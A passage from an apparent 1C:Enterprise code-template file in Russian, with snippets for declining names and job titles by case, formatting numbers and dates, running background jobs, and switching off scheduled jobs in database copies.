		б = а;
		
	КонецЦикла;
	
	Возврат Ответ + б;
	
КонецФункции"}
},
{0,
{"Cклонения по падежам",0,0,"","// Функция для склонения одного слова!!!
// z1 - само слово
// z2 - номер падежа
// z3 - пол
// z4 - 1-склонять как фамилию, 2-имя, 3-отчество
Функция ПадежС(z1,Знач z2=2,Знач z3=""*"",z4=0) Экспорт
	z5=Найти(z1,""-"");
	z6=?(z5=0,"""",""-""+ПадежС(Сред(z1,z5+1,СтрДлина(z1)-z5+1),z2,z3,z4));
	z1=НРег(?(z5=0,z1,Лев(z1,z5-1)));
	z7=Прав(z1,3);z8=Прав(z7,2);z9=Прав(z8,1);
	z5=СтрДлина(z1);
	za=Найти(""ая ия ел ок яц ий па да ца ша ба та га ка"",z8);
	zb=Найти(""аеёийоуэюяжнгхкчшщ"",Лев(z7,1));
	zc=Макс(z2,-z2);
	zd=?(za=4,5,Найти(""айяь"",z9));
	zd=?((zc=1)или(z9=""."")или((z4=2)и(Найти(""оиеу""+?(z3=""ч"","""",""бвгджзклмнпрстфхцчшщъ""),z9)>0))или((z4=1)и(Найти(""мия мяэ лия кия жая лея"",z7)>0)),9,?((zd=4)и(z3=""ч""),2,?(z4=1,?(Найти(""оеиую"",z9)+Найти(""их ых аа еа ёа иа оа уа ыа эа юа яа"",z8)>0,9,?(z3<>""ч"",?(za=1,7,?(z9=""а"",?(za>18,1,6),9)),?(((Найти(""ой ый"",z8)>0)и(z5>4)и(Прав(z1,4)<>""опой""))или((zb>10)и(za=16)),8,zd))),zd)));
	ze=Найти(""лец вей бей дец пец мец нец рец вец аец иец ыец бер"",z7);
	zf=?((zd=8)и(zc<>5),?((zb>15)или(Найти(""жий ний"",z7)>0),""е"",""о""),?(z1=""лев"",""ьв"",?((Найти(""аеёийоуэюя"",Сред(z1,z5-3 ,1))=0)и((zb>11)или(zb=0))и(ze<>45),"""",?(za=7,""л"",?(za=10,""к"",?(za=13,""йц"",?(ze=0,"""",?(ze<12,""ь""+?(ze=1,""ц"",""""),?(ze<37,""ц"",?(ze<49,""йц"",""р""))))))))));
	zf=?((zd=9)или((z4=3)и(z3=""ы"")),z1,Лев(z1,z5-?((zd>6)или(zf<>""""),2,?(zd>0,1,0)))+zf+СокрП(Сред(""а у а ""+Сред(""оыые"",Найти(""внч"",z9)+1,1)+""ме ""+?(Найти(""гжкхш"",Лев(z8,1))>0,""и"",""ы"")+"" е у ойе я ю я ем""+?(za=16,""и"",""е"")+"" и е ю ейе и и ь ьюи и и ю ейи ойойу ойойойойуюойойгомуго""+?((zf=""е"")или(za=16)или((zb>12)и(zb<16)),""и"",""ы"")+""мм"",10*zd+2*zc-3,2)));
	Возврат ?(""""=z1,"""",?(z4>0,ВРег(Лев(zf,1))+?((z2<0)и(z4>1),""."",Сред(zf,2)),zf)+z6);
КонецФункции
//_____________________________________________________________________________
// z1 - фамилия имя отчество например Железняков Юрий Юрьевич
// z2 - Падеж ( по  умолчанию = 2 - родительный)
// 2 - родительный  ( нет кого?    ) Железнякова Юрия Юрьевича     
// 3 - дательный    ( кому?        ) Железнякову Юрию Юрьевичу 
// 4 - винительный  ( вижу кого?   ) Железнякова Юрия Юрьевича  
// 5 - творительный ( кем?         ) Железняковым Юрием Юрьевичем    
// 6 - предложный   ( о ком?       ) Железнякове Юрии Юрьевиче 
// Если задать Z2 меньше 0, то на выходе получим от -1=Железняков Ю. Ю. до -6=Железнякове Ю. Ю.
// z3 - параметр Пол может не указываться, но при наличии фамилий с 
// инициалами точное определение пола невозможно, поэтому предлагается задавать пол этим
// параметром  1 - мужской 2 - женский  
// ДЛЯ СКЛОНЕНИЯ ПРОФЕССИЙ ИСПОЛЬЗУЙТЕ ФУНКЦИЮ ПАДЕЖП И БУДЕТ ВАМ СЧАСТЬЕ!
// ---------------------------------------------------------------------------------------
// Бибик Галушка Цой Николайчик Наталия Петровна Герценберг Кривошей Капица-Метелица
// Если Падеж(Фио ,1 ,3),       то на выходе получим Фамилия Имя Отчество и т.д.
// Если Падеж(Фио ,1 ,3,""1"" ),  то                   Фамилия 
// Если Падеж(Фио ,1 ,3,""2"" ),  то                   Имя 
// Если Падеж(Фио ,1 ,3,""3"" ),  то                   Отчество 
// Если Падеж(Фио, 1 ,3,""12"" ), то                   Фамилия Имя 
// Если Падеж(Фио, 1 ,3,""23"" ), то                   Имя Отчество 
// Если Падеж(Фио,-1 ,3,""231"" ),то                   И. О. Фамилия 
// Если Падеж(Фио,-1 ,3,""23"" ), то                   И. О.  
// 10-11-2003 3-20

Функция Падежик(z1,z2=2,z3=3,Знач z4=""123"",z5=1) Экспорт
	Возврат?(z5<4,Падежик(СокрЛП(СтрЗаменить(Сред(z1,Найти(z1+"" "","" "")+1),""."","". "")),z2,z3,СтрЗаменить(z4,z5,ПадежС(Лев(z1,Найти(z1+"" "","" "")-1),z2,Сред(""ча""+НРег(Прав(СокрП(z1),1)),z3,1),z5)+"" ""),z5+1),z4);
КонецФункции//Падежик

Функция Падеж(z1,z2=2,z3=3,Знач z4=""123"") Экспорт
	z1=СокрП(z1);
	z5=Прав(z1,4);
	z6=Найти(""оглы кызы"",z5);
	Возврат Падежик(?(z6>0,Лев(z1,СтрДлина(z1)-5),z1),z2,z3,z4)+?(z6>0,z5,"""");
КонецФункции//Падеж

Функция ПадежП(Знач z1,Знач z2,z3=0) Экспорт
	z1=СокрЛП(z1);z4=Найти(z1+"" "","" "")+1;z5=Лев(z1,z4-2);z6=Прав(z5,2);
	z7=?((Найти(""ая ий ый"",z6)>0)и(Найти(""ющий нный"",Сред(z1,z4-5,4))=0)и(z3=0),""1"",""*"");
	Возврат НРег(?((z6=""ая"")или(Прав(z6,1)=""а""),ПадежС(z5,z2,z7,1)+"" ""+ПадежС(Сред(z1,z4),z2),ПадежС(z5,z2,""ч"",1)+?((z6=""ий"")и(Найти(z1,"" "")=0),"""","" ""+?(z7=""1"",ПадежП(Сред(z1,z4),z2,Число(z7)),Сред(z1,z4)))));
	// Прим: ДолжнРук=ПадежП(Выборка.ДолжностьРуководителя,2);
КонецФункции//ПадежП

// Пример использования
ПодписантРодитПад=Падеж(Константа.Руководитель.Получить(ДатаДок),-2); 
// (c) Jurer Production End ( Finish )"}
},
{0,
{"Cклонения по падежам из УНФ чья-то",0,0,"","//Функция возвращает фамилию, имя и отчество в нужном падеже
//-------------------------------------------------------------------------
// ФИО - строка формата Фамилия Имя Отчество (через пробел), можно опускать Имя и/или Отчество
// Падеж - название падежа (хоть первая буква) или его № 1-6
// ТолькоИнициалы - если истина, то будут только первые буквы вида Фамилия И.О.
//-------------------------------------------------------------------------
//автор: (Софья Коган?)
Функция ПадежФИО(Знач ФИО,Падеж=1,ТолькоИнициалы=Ложь) Экспорт
	
	Если ТипЗнч(ФИО)<>Тип(""Строка"") Тогда
		Сообщить(""Неверная строка передана """"падежу ФИО!"""""");
		Возврат ФИО;
	КонецЕсли;
	
	// уберем множественные пробелы
	Пока Истина Цикл
		ФИО=СокрЛП(СтрЗаменить(ФИО,""  "","" ""));
		Если Найти(ФИО,""  "")=0 Тогда 
			Прервать 
		КонецЕсли;
	КонецЦикла;
	
	Если ТипЗнч(Падеж)=Тип(""Строка"") Тогда
		пад=СокрЛП(НРег(Лев(Падеж,1))); 
		Если Найти(""рдвтп"",пад)=0 Тогда
			Сообщить(""Неверный падеж передан """"падежу ФИО""""!""); 
			Возврат ФИО;
		КонецЕсли;
	ИначеЕсли ТипЗнч(Падеж)=Тип(""Число"") Тогда
		Если (Падеж<1) или (Падеж>6) Тогда
			Сообщить(""Неверный падеж передан """"падежу ФИО""""!""); 
			Возврат ФИО;
		КонецЕсли;			
		пад=Падеж-1;
	КонецЕсли;
	
	ФИО=СокрЛП(НРег(ФИО)); // так удобнее
	
	// свой анализатор состава
	Фамилия="""";
	Для й=1 По СтрДлина(ФИО) Цикл
		символс=Сред(ФИО,й,1);
		Если символс="" "" Тогда 
			Прервать
		КонецЕсли;
		Фамилия=Фамилия+символс;
	КонецЦикла;
	ы=й+1; // перешли пробел
	Имя="""";
	Для й=ы По СтрДлина(ФИО) Цикл
		символс=Сред(ФИО,й,1);
		Если символс="" "" Тогда 
			Прервать 
		КонецЕсли;
		Имя=Имя+символс;
	КонецЦикла;
	ы=й+1; // перешли второй пробел
	Отчество="""";
	Для й=ы По СтрДлина(ФИО) Цикл
		символс=Сред(ФИО,й,1);
		Если символс="" "" Тогда
			Прервать 
		КонецЕсли;
		Отчество=Отчество+символс;
	КонецЦикла;
	
	// вернем, если сам именительный
	Если (Лев(Падеж,1)=""И"") или (Падеж=1) Тогда
		Если ТолькоИнициалы Тогда
			Имя=Лев(Имя,1); Отчество=Лев(Отчество,1);
		КонецЕсли;
		Фамилия=ВРег(Лев(Фамилия,1))+Сред(Фамилия,2);
		Имя=ВРег(Лев(Имя,1))+Сред(Имя,2);
		Отчество=ВРег(Лев(Отчество,1))+Сред(Отчество,2);
		Возврат Фамилия + "" "" + Имя + "". "" + Отчество + ""."";
	КонецЕсли;
	
	// теперь имеем раздельно Фамилию, Имя и Отчество.	
	// начинается собственно блок анализа содержания и падежей
	
	// проанализируем пол М/Ж
	Если Прав(Отчество,1)=""а"" Тогда Пол=""Ж"" Иначе Пол=""М"" КонецЕсли;
	
	// создадим структуру таблицы, хранящей окончания слов
	ток=Новый ТаблицаЗначений;
	ТипСтроки=Новый ОписаниеТипов(""Строка"",Новый КвалификаторыСтроки(2));
	ТипЧисла=Новый ОписаниеТипов(""Число"",Новый КвалификаторыЧисла(1,0));
	ток.Колонки.Добавить(""СтарОк"",ТипСтроки); // старое окончание 2 символа
	// колонки, хранящие новые окончания слов
	ток.Колонки.Добавить(""р""); // родительный
	ток.Колонки.Добавить(""д""); // дательный
	ток.Колонки.Добавить(""в""); // винительный
	ток.Колонки.Добавить(""т""); // творительный
	ток.Колонки.Добавить(""п""); // предложный
	// для указания, сколько букв с конца слова отсечь,
	ток.Колонки.Добавить(""КолвоСрез"",ТипЧисла); // кол-во срезаемых букв
	
	Гласные=""аеэоуиыяюьъ""; // список гласных букв в виде строки
	
	// ======== обработаем фамилию ==========
	// заполним таблицу данными для фамилии
	
	Если пол=""М"" Тогда
		строток=ток.Добавить(); // иванов
		строток.СтарОк=""*s"";
		строток.р=""а""; строток.д=""у""; строток.в=""а""; строток.т=""ым""; строток.п=""е"";
		строток.КолвоСрез=0;
		
		строток=ток.Добавить(); // красинский
		строток.СтарОк=""*й""; 
		строток.р=""ого""; строток.д=""ому""; строток.в=""ого""; строток.т=""им""; строток.п=""ом"";
		строток.КолвоСрез=2;		
		
		строток=ток.Добавить(); // белый
		строток.СтарОк=""ый"";
		строток.р=""ого""; строток.д=""ому""; строток.в=""ого""; строток.т=""ым""; строток.п=""ом"";
		строток.КолвоСрез=2;
		
		строток=ток.Добавить(); // палей
		строток.СтарОк=""*й"";
		строток.р=""я""; строток.д=""ю""; строток.в=""я""; строток.т=""ем""; строток.п=""е"";
		строток.КолвоСрез=1;
		
		строток=ток.Добавить(); // рабинович
		строток.СтарОк=""*ч"";
		строток.р=""а""; строток.д=""у""; строток.в=""а""; строток.т=""ем""; строток.п=""е"";
		строток.КолвоСрез=0;
		
		строток=ток.Добавить(); // починок, зализняк
		строток.СтарОк=""*к"";
		строток.р=""ка""; строток.д=""ку""; строток.в=""ка""; строток.т=""ком""; строток.п=""ке"";
		строток.КолвоСрез=2;
		
		строток=ток.Добавить(); // шинкарь
		строток.СтарОк=""*ь"";
		строток.р=""я""; строток.д=""ю""; строток.в=""я""; строток.т=""ем""; строток.п=""е"";
		строток.КолвоСрез=1;
		
		строток=ток.Добавить(); // перельман, оганесян
		строток.СтарОк=""*н"";
		строток.р=""а""; строток.д=""у""; строток.в=""а""; строток.т=""ом""; строток.п=""е"";
		строток.КолвоСрез=0;
		
		строток=ток.Добавить(); // баранкин
		строток.СтарОк=""ин"";
		строток.р=""а""; строток.д=""у""; строток.в=""а""; строток.т=""ым""; строток.п=""е"";
		строток.КолвоСрез=0;
		
	ИначеЕсли Пол=""Ж"" Тогда		
		строток=ток.Добавить(); // склодовская
		строток.СтарОк=""ая"";
		строток.р=""ой""; строток.д=""ой""; строток.в=""ую""; строток.т=""ой""; строток.п=""ой"";
		строток.КолвоСрез=2;
		
		строток=ток.Добавить(); // иванова
		строток.СтарОк=""*а""; 
		строток.р=""ой""; строток.д=""ой""; строток.в=""у""; строток.т=""ой""; строток.п=""ой"";
		строток.КолвоСрез=1;
	КонецЕсли;
	
	// таблица заполнена. считаем 2 последних буквы и поищем их
	Если не ПустаяСтрока(Фамилия) Тогда
		пб=Прав(Фамилия,2); кол=""СтарОк""; // ищем по ней
		новФамилия=Фамилия; // если ничего не изменится, так и будет
		стро=ток.Найти(пб,кол);
		Если стро<>Неопределено Тогда // нашли строгое сразу
			Основа=Лев(Фамилия,СтрДлина(Фамилия)-стро.КолвоСрез);
			новФамилия=Основа+СокрЛП(стро[пад]);
		Иначе // строго не нашли, ищем только по последней
			пб=""*""+Прав(пб,1); 
			стро=ток.Найти(пб,кол);
			Если стро<>Неопределено Тогда // нашли по последней
				Основа=Лев(Фамилия,СтрДлина(Фамилия)-стро.КолвоСрез);
				новФамилия=Основа+СокрЛП(стро[пад]);
			Иначе // по последней не нашли, ищем по виду буквы
				пб=""*""+?(Найти(Гласные,Прав(пб,1))=0,""s"",""g"");
				стро=ток.Найти(пб,кол);
				Если стро<>Неопределено Тогда // нашли по виду
					Если НЕ Прав(Фамилия,1) = ""."" Тогда
						Основа=Лев(Фамилия,СтрДлина(Фамилия)-стро.КолвоСрез);
						новФамилия=Основа+СокрЛП(стро[пад]);
					КонецЕсли;
				КонецЕсли;
			КонецЕсли;
		КонецЕсли;
	Иначе
		новФамилия="""";
	КонецЕсли;
	
	// ======== обработаем имя ==========
	// заполним таблицу данными для имени
	ток.Очистить();
	
	Если Пол=""М"" Тогда
		// обработаем исключения
		Если Имя=""лев"" Тогда Имя=""льв"" КонецЕсли;
		Если Имя=""павел"" Тогда Имя=""павл"" КонецЕсли;
		
		строток=ток.Добавить(); // сергей
		строток.старок=""*й"";
		строток.р=""я""; строток.д=""ю""; строток.в=""я""; строток.т=""ем""; строток.п=""е"";
		строток.колвосрез=1;
		
		строток=ток.Добавить(); // иван + лев + павел
		строток.старок=""*s"";
		строток.р=""а""; строток.д=""у""; строток.в=""а""; строток.т=""ом""; строток.п=""е"";
		строток.колвосрез=0;
		
		строток=ток.Добавить(); // никита
		строток.старок=""*а"";
		строток.р=""ы""; строток.д=""е""; строток.в=""у""; строток.т=""ой""; строток.п=""е"";
		строток.колвосрез=1;
		
		строток=ток.Добавить(); // лука
		строток.старок=""*а"";
		строток.р=""и""; строток.д=""е""; строток.в=""у""; строток.т=""ой""; строток.п=""е"";
		строток.колвосрез=1;
		
		строток=ток.Добавить(); // иеремия
		строток.старок=""ия"";
		строток.р=""и""; строток.д=""и""; строток.в=""ю""; строток.т=""ей""; строток.п=""и"";
		строток.колвосрез=1;
		
		строток=ток.Добавить(); // илья
		строток.старок=""*я"";
		строток.р=""и""; строток.д=""е""; строток.в=""ю""; строток.т=""ей""; строток.п=""е"";
		строток.колвосрез=1;
		
		строток=ток.Добавить(); // игорь
		строток.старок=""*ь"";
		строток.р=""я""; строток.д=""ю""; строток.в=""я""; строток.т=""ем""; строток.п=""е"";
		строток.колвосрез=1;
		
	ИначеЕсли Пол=""Ж"" Тогда
		
		строток=ток.Добавить(); // ирина
		строток.старок=""*а"";
		строток.р=""ы""; строток.д=""е""; строток.в=""у""; строток.т=""ой""; строток.п=""е"";
		строток.колвосрез=1;
		
		строток=ток.Добавить(); // эсфирь
		строток.старок=""*ь"";
		строток.р=""и""; строток.д=""и""; строток.в=""ь""; строток.т=""ью""; строток.п=""и"";
		строток.колвосрез=1;
		
		строток=ток.Добавить(); // мария
		строток.старок=""ия"";
		строток.р=""и""; строток.д=""и""; строток.в=""ю""; строток.т=""ей""; строток.п=""и"";
		строток.колвосрез=1;
		
		строток=ток.Добавить(); // софья
		строток.старок=""*я"";
		строток.р=""и""; строток.д=""е""; строток.в=""ю""; строток.т=""ей""; строток.п=""е"";
		строток.колвосрез=1;
	КонецЕсли;
	
	// таблица заполнена. считаем 2 последних буквы и поищем их
	Если не ПустаяСтрока(Имя) Тогда
		пб=Прав(Имя,2); кол=""СтарОк""; // ищем по ней
		новИмя=Имя; // если ничего не изменится, так и будет
		стро=ток.Найти(пб,кол);
		Если стро<>Неопределено Тогда // нашли строгое сразу
			Основа=Лев(Имя,СтрДлина(Имя)-стро.КолвоСрез);
			новИмя=Основа+СокрЛП(стро[пад]);
		Иначе // строго не нашли, ищем только по последней
			пб=""*""+Прав(пб,1); 
			стро=ток.Найти(пб,кол);
			Если стро<>Неопределено Тогда // нашли по последней
				Основа=Лев(Имя,СтрДлина(Имя)-стро.КолвоСрез);
				новИмя=Основа+СокрЛП(стро[пад]);
			Иначе // по последней не нашли, ищем по виду буквы
				пб=""*""+?(Найти(Гласные,Прав(пб,1))=0,""s"",""g"");
				стро=ток.Найти(пб,кол);
				Если стро<>Неопределено=1 Тогда // нашли по виду
					Основа=Лев(Имя,СтрДлина(Имя)-стро.КолвоСрез);
					новИмя=Основа+СокрЛП(стро[пад]);
				КонецЕсли;
			КонецЕсли;
		КонецЕсли;
	Иначе
		новИмя="""";
	КонецЕсли;
	
	// ======== обработаем отчество, тут проще ==========
	ток.Очистить();
	
	Если Пол=""М"" Тогда
		строток=ток.Добавить();
		строток.р=""а""; строток.д=""у""; строток.в=""а""; строток.т=""ем""; строток.п=""е"";
		строток.колвосрез=0;
	ИначеЕсли Пол=""Ж"" Тогда
		строток=ток.Добавить();
		строток.р=""ы""; строток.д=""е""; строток.в=""у""; строток.т=""ой""; строток.п=""е"";
		строток.колвосрез=1;
	КонецЕсли;
	Если не ПустаяСтрока(Отчество) Тогда
		Основа=Лев(Отчество,СтрДлина(Отчество)-ток[0].КолвоСрез);	
		новОтчество=Основа+СокрЛП(ток[0][пад]);
	Иначе
		новОтчество="""";
	КонецЕсли;	
	
	Если ТолькоИнициалы Тогда
		новИмя=Лев(новИмя,1)+"".""; 
		новОтчество=Лев(новОтчество,1)+""."";
	КонецЕсли;
	
	// установим первые буквы верхним регистром
	новФамилия=ВРег(Лев(новФамилия,1))+Сред(новФамилия,2);
	новИмя=ВРег(Лев(новИмя,1))+Сред(новИмя,2);
	новОтчество=ВРег(Лев(новОтчество,1))+Сред(новОтчество,2);
	
	// и теперь всё вместе	
	новФИО=новФамилия+"" ""+новИмя+"" ""+новОтчество;
	Возврат новФИО;
КонецФункции
"}
},
{0,
{"ПросклонятьФразуПоСловам",0,0,"","Функция ПросклонятьФразуПоСловам(Знач ИсходнаяСтрока, Падеж) Экспорт

    Результат = """";

    ИсходнаяСтрока = СокрЛП(ИсходнаяСтрока);
    Если СтрДлина(ИсходнаяСтрока) = 0 Тогда
        Возврат Результат;
    КонецЕсли;

    Поз = Найти(ИсходнаяСтрока, "" "");
    Пока Поз > 0 Цикл

        СловоВПадеже = """";

        Слово = Лев(ИсходнаяСтрока, Поз-1);
        УниверсальныеМеханизмы.Просклонять(глЗначениеПеременной(""глКомпонентаСклоненияФИО""), Слово, Падеж, , СловоВПадеже);

        Результат = СокрЛП(Результат + "" "" + НРег(СловоВПадеже));
        ИсходнаяСтрока = СокрЛП(Сред(ИсходнаяСтрока, Поз));

        Если ПустаяСтрока(ИсходнаяСтрока) Тогда
            Прервать;// Это перестраховка. Цикл и так должен прерваться
 
        КонецЕсли;

        Поз = Найти(ИсходнаяСтрока, "" "");
    КонецЦикла;

    Если НЕ ПустаяСтрока(ИсходнаяСтрока) Тогда// добавляем заключительное слово
 
        СловоВПадеже = """";
        УниверсальныеМеханизмы.Просклонять(глЗначениеПеременной(""глКомпонентаСклоненияФИО""), ИсходнаяСтрока, Падеж, , СловоВПадеже);
        Результат = СокрЛП(Результат + "" "" + НРег(СловоВПадеже));

    КонецЕсли;
    
    Возврат Результат;

КонецФункции// ПросклонятьФразуПоСловам()"}
},
{0,
{"Просклонять через ФИО и ФизическиеЛицаЗарплатаКадры.Просклонять",0,0,"","&НаСервереБезКонтекста
Функция ДолжностьПросклонятьПредставление(Должность)

	ДолжностьМассив = СтрРазделить(Должность, "" "", Ложь);
	
	ДолжностьРезультат = """";
	
	Для каждого ЭлМасс Из ДолжностьМассив Цикл
		Результат = """";
		ФизическиеЛицаЗарплатаКадры.Просклонять(ЭлМасс, 2, Результат);
		
		ДолжностьРезультат = ДолжностьРезультат + Результат + "" "";
		
	КонецЦикла; 
	
	Возврат НРег(СокрЛП(ДолжностьРезультат));

КонецФункции // ДолжностьПросклонятьПредставление()"}
}
},
{4,
{"Формат",1,0,"",""},
{0,
{"Как убрать пробелы из числа 1С",0,0,"Формат","<?""Введите переменную для приминения формата"">Строка = Формат(<?""Введите переменную для приминения формата"">, ""ЧГ="");"}
},
{0,
{"Формат даты (ДФ=yyyy-MM-dd)",0,0,"ФорматД","Формат(ТекущаяДата(), ""ДФ=yyyy<?""Разделитель (\"".\"", \""-\"", \""/\"" и т.д.)"">MM<?""Разделитель (\"".\"", \""-\"", \""/\"" и т.д.)"">dd"")"}
},
{0,
{"Формат даты (ДФ=dd-MM-yyyy)",0,0,"ФорматД","Формат(ТекущаяДата(), ""ДФ=dd<?""Разделитель (\"".\"", \""-\"", \""/\"" и т.д.)"">MM<?""Разделитель (\"".\"", \""-\"", \""/\"" и т.д.)"">yyyy"")"}
},
{0,
{"Формат даты и времени (ДФ='yyyy-MM-dd_HH-mm-ss')",0,0,"ФорматДВ","Формат(ТекДата, ""ДФ='yyyy<?""Разделитель (\"".\"", \""-\"", \""/\"" и т.д.)"">MM<?""Разделитель (\"".\"", \""-\"", \""/\"" и т.д.)"">dd_HH<?""Разделитель (\"".\"", \""-\"", \""/\"" и т.д.)"">mm<?""Разделитель (\"".\"", \""-\"", \""/\"" и т.д.)"">ss'"")"}
}
},
{3,
{"Регламентные и фоновые задания",1,0,"",""},
{2,
{"Фоновые задания",1,0,"",""},
{0,
{"СейчасВыполняетсяЗадание",0,0,"","Функция СейчасВыполняетсяЗадание(НазваниеЗадания) Экспорт
	
	мФоновыеЗадания = ФоновыеЗадания.ПолучитьФоновыеЗадания(Новый структура(""Наименование"", НазваниеЗадания));
	
	Для каждого ТекЭлемент из мФоновыеЗадания Цикл
		
		Если ТекЭлемент.Конец = Неопределено тогда
			Возврат Истина		
		КонецЕсли;
		
	КонецЦикла;
	
	Возврат Ложь;
	
КонецФункции"}
},
{0,
{"ПолучитьПоследнееВыполнениеЗадания",0,0,"","Функция ПолучитьПоследнееВыполнениеЗадания(НазваниеЗадания) Экспорт
	
	Результат = Неопределено;
	
	мФоновыеЗадания = ФоновыеЗадания.ПолучитьФоновыеЗадания(Новый структура(""Наименование"", НазваниеЗадания));
	
	Для каждого ТекЭлемент из мФоновыеЗадания Цикл
		
		Если ТекЭлемент.Конец <> Неопределено тогда
			Результат =  ТекЭлемент.Конец;		
		КонецЕсли;
		
	КонецЦикла;
	
	Возврат Результат;
	
КонецФункции"}
}
},
{0,
{"Фоновое задание",0,0,"","// В общем модуле
Перем V<?""Версия платформы (например \""82\"", \""83\"", без кавычек)"">Com Экспорт;

Процедура ПередНачаломРаботыСистемы(Отказ)
	Если ИмяПользователя() = ""<?""Регламентный пользователь"">"" тогда
		ПодключитьОбработчикОжидания(""ОбработчикОжидания"",5);
	КонецЕсли;
КонецПроцедуры

Процедура ОбработчикОжидания() Экспорт
	ВыполнитьОбработкуЗаданий();
	Тест = ИмяПользователя() + "" ОбработчикОжидания.ВыполнитьОбработкуЗаданий "" + Строка(ТекущаяДата());
	Сообщить(Тест);
КонецПроцедуры

Процедура ПриНачалеРаботыСистемы()
	Сообщение = Новый СообщениеПользователю;
	Сообщение.Текст = ИмяПользователя() + "" ПриНачалеРаботыСистемы "" + Строка(ТекущаяДата());
	Сообщение.Сообщить();
	
	Если ИмяПользователя() <> ""<?""Регламентный пользователь"">"" Тогда // Иначе начнуться бесконечные рекурсивные открывания 1С
		V<?""Версия платформы (например \""82\"", \""83\"", без кавычек)"">Com = Новый COMОбъект(""V83.Application"");
		Попытка
			Открытие = V<?""Версия платформы (например \""82\"", \""83\"", без кавычек)"">Com.Connect(СтрокаСоединенияИнформационнойБазы()+ ""Usr=""""<?""Регламентный пользователь"">"""";Pwd="""""""";"");
		Исключение
			ТекстОшибки = ИнформацияОбОшибке();
			Сообщение = Новый СообщениеПользователю;
			Сообщение.Текст = ""При попытке открытия дополнительного приложения возникла ошибка: "" + ТекстОшибки.Описание;
			Сообщение.Сообщить();
			//Отказ = Истина;
			//Возврат;
		КонецПопытки;
	ИначеЕсли ИмяПользователя() = ""<?""Регламентный пользователь"">"" Тогда
		ОбщийМодуль1.НачатьРегЗадание();
	КонецЕсли;
	
КонецПроцедуры

// В общем модуле
Процедура НачатьРегЗаданиеНаСервере() Экспорт
	Фоновое = ФоновыеЗадания.Выполнить(""ОбщийМодуль.РегламентноеЗадание1"");
	Тест = ИмяПользователя() + "" ОбщийМодуль.НачатьРегЗаданиеНаСервере "" + Строка(ТекущаяДата()) + "" Начало фонового "" + Строка(Фоновое.Начало);
	Сообщить(Тест);
КонецПроцедуры"}
},
{0,
{"Отключение регламентных заданий в копии базы (через константу ИмяРабочейБазы)",0,0,"","////////////////////////////////////////////////////////////////////////////////
// Отключение регламентных заданий в копии базы


//Данный код позволит вам автоматически отключать регламентные задачи в копиях баз данных.
//У нас есть регламентные задачи которые надо выполнять только на рабочей базе (забирает данные с другой базы). При создание копии базы данные «уходили» в нерабочую базу. Что бы это искоренить был придуман следующий алгоритм дейсвий:
//В константе «ИмяРабочейБазы» прописывается имя рабочей базы (Например: ”UT82_Live”)
//Если создается копия базы то она называется по другому (Например: ”UT82_Test”)
//Если имя базы не совпадает с константой «ИмяРабочейБазы», то идет отключение регламенты задач.
//Для этого была создана процедура «ПроверкаНаКопию()». Процедура находиться в общем привилигированнм модуле.
//Вызваться процедура при инициализации сеанса пользователя («Модуль сеанса» - Процедура «УстановкаПараметровСеанса()»).
//Сама процедура:

// Проверяет не являеться ли текущая база копией
// Определяеться по константе ИмяРабочейБазы - которая не должна отличаться от текущей базы
// Если база копия то отрубаем регламентное задание
// Истина - это не копия
// Ложь - это копия базы
Функция ПроверкаНаКопию()  Экспорт
    // ---- Проверка на копию ----
    ИмяРабочейБазы = СокрЛП(НРег(Константы.ИмяРабочейБазы.Получить()));
    СтрокаСоединения = НРег(СтрокаСоединенияИнформационнойБазы());

    ИскомаяБаза = """""""" + ИмяРабочейБазы + """""""";
    БазаНайдена = Найти(СтрокаСоединения,ИскомаяБаза) > 0;

    Если БазаНайдена и Не ПустаяСтрока(ИмяРабочейБазы) тогда
        Возврат Истина;
    Иначе
        #Если НаКлиенте тогда
        Сообщить(""Текущая базе не являеться рабочей! (см. константу """"ИмяРабочейБазы"""") "" + Константы.ИмяРабочейБазы.Получить());
        #КонецЕсли
    КонецЕсли;

    // ---- Инцилизиурем константы ----

    ИмяСервера = ""server1C"";        // адрес 1С сервер
    АдминКластера = """";
    ПарольАдминаКластера = """";
    Админ1С = ""COMConnect"";     // пользователь с полными правами
    ПарольАдмина1С = """";        // пароль админа 1С

    // ---- Отписываемся от регламентых заданий ----
    Соединение = Новый COMОбъект(""V82.COMConnector"");               // Соединились с 1С
    Попытка
        СоединениеАгент = Соединение.ConnectAgent(ИмяСервера);      // Соединились с 1С Агентом
        Кластеры = СоединениеАгент.GetClusters();                   // Получитли массив кластеров (COMSafeArray)
    Исключение
        #Если НаКлиенте тогда
        Сообщить(""Ошибка соединения с COM сервером: "" + ОписаниеОшибки());
        #КонецЕсли
        Возврат Ложь;
    КонецПопытки;

    КоличествоКластеров = Кластеры.GetLength(0);
    Если КоличествоКластеров < 1 тогда
        #Если НаКлиенте тогда
        Сообщить(""Не найден кластер на сервере "" + ИмяСервера);
        #КонецЕсли
        Возврат Ложь;
    КонецЕсли;

    РабочийКластер = Кластеры.GetValue(0);
    Попытка
        // Авторизируемся на кластере (Кластер,Имя,Пароль)
        СоединениеАгент.Authenticate(РабочийКластер, АдминКластера, ПарольАдминаКластера);
    Исключение
        #Если НаКлиенте тогда
        Сообщить(""Ошибка авторизации: "" + ОписаниеОшибки());
        #КонецЕсли
        Возврат Ложь;
    КонецПопытки;

    // Подключаемся к рабочему процессу
    РабочийПроцесс = СоединениеАгент.GetWorkingProcesses(РабочийКластер).GetValue(0);
    Порт = СтрЗаменить(Строка(РабочийПроцесс.MainPort),Символы.НПП,"""");  // убиваем непереносимые пробелы
    СтрокаПодлючения = РабочийПроцесс.HostName + "":"" + Порт;
    СоединениеСРабочимПроцессом = Соединение.ConnectWorkingProcess(СтрокаПодлючения);
    СоединениеСРабочимПроцессом.AddAuthentication(Админ1С,ПарольАдмина1С);

    // Ищем текущую базу данных
    МассивБаз = СоединениеСРабочимПроцессом.GetInfoBases();
    БазаНайдена = Ложь;
    Для каждого РабочаяБаза из МассивБаз цикл
        ИскомаяБаза = НРег("""""""" + РабочаяБаза.Name + """""""");
        БазаНайдена = Найти(СтрокаСоединения,ИскомаяБаза) > 0;
        Если БазаНайдена тогда
            Прервать;
        КонецЕсли;
    КонецЦикла;

    Если Не БазаНайдена тогда
        #Если НаКлиенте тогда
        Сообщить(""База ("" + СтрокаСоединения + "") не найдена на сервере "" + ИмяСервера);
        #КонецЕсли
        Возврат Ложь;
    КонецЕсли;

    Если НЕ РабочаяБаза.ScheduledJobsDenied тогда
        #Если НаКлиенте тогда
        Сообщить(""Отключаем регламентное задание"");
        #КонецЕсли
        РабочаяБаза.ScheduledJobsDenied = Истина;   // Блокируем выполнения регламентных заданий
